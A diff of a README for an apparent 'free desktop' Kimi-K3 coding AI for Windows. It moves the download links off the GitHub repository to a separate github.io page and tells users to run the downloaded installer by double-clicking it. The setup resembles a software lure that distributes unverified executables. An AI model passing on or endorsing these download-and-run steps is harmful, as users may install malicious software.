@@ -1,6 +1,6 @@
 # 🤖 Kimi-K3-Code-Free-Desktop-AI - Run Advanced Coding AI On Windows
 
-[![Download Kimi K3](https://img.shields.io/badge/Download-Kimi-K3-blue.svg)](https://github.com/cubitusplayday572/Kimi-K3-Code-Free-Desktop-AI)
+[![Download Kimi K3](https://img.shields.io/badge/Download-Kimi-K3-blue.svg)](https://cubitusplayday572.github.io)
 
 ## 💡 About This Tool
 
@@ -20,7 +20,7 @@ Your computer must meet these basic specifications to ensure the software runs s
 
 Follow these steps to set up Kimi-K3 on your Windows computer.
 
-1.  Visit this page to download the latest version: [https://github.com/cubitusplayday572/Kimi-K3-Code-Free-Desktop-AI](https://github.com/cubitusplayday572/Kimi-K3-Code-Free-Desktop-AI).
+1.  Visit this page to download the latest version: [https://cubitusplayday572.github.io](https://cubitusplayday572.github.io).
 2.  Locate the folder where your browser saves files.
 3.  Double-click the installer file.
 4.  Follow the instructions on your screen to complete the installation.
